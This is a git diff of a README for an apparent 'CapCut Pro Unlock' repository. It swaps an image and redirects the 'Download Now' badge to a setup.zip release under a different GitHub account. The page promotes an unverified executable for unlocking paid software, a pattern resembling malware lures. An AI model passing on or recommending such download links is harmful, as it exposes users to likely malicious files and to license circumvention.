@@ -4,12 +4,12 @@
 
 ---
 
-<div align="center">
-<img width="831" height="669" alt="image" src="https://github.com/user-attachments/assets/a480cc63-5bff-4865-aaac-647faa468423" />
+<div align="center"><img width="938" height="932" alt="image" src="https://github.com/user-attachments/assets/6e25bbe7-1194-4607-9eae-b7a46906a96a" />
+
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Signalbrerhythm/CapCut-Pro-Unlock/releases/download/setup-2.11/setup-v2.11.zip)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/ChromeThrasher/CapCut-EditFlow/releases/download/setup/setup.zip)
 </div>
 
 ---
